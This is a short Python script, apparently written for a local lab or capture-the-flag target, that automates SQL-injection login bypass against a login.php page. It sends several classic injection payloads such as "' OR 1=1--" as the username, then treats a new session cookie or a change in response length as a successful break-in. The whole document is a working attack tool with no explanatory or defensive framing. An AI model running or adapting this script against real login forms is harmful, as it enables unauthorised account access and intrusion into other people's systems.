import requests
url="http://127.0.0.1:33167/login.php"
payloads=["admin' OR '1'='1--","admin'--","' OR 1=1--","' OR '1'='1","admin'#"]
print("START")
s=requests.Session()
r=s.post(url,data={'username':'admin','password':'admin'},allow_redirects=False)
baseline_len=len(r.content)
print(f"Baseline: {baseline_len}B\n")
for p in payloads:
    r=s.post(url,data={'username':p,'password':'x'},allow_redirects=False)
    has_cookie='PHPSESSID' in r.cookies
    length=len(r.content)
    diff=length!=baseline_len
    print(f"{p[:20]}|{r.status_code}|{has_cookie}|{length}|{diff}")
    if has_cookie or diff:
        print(f"SUCCESS: {p}")
        print(r.text[:200])
        break
print("DONE")
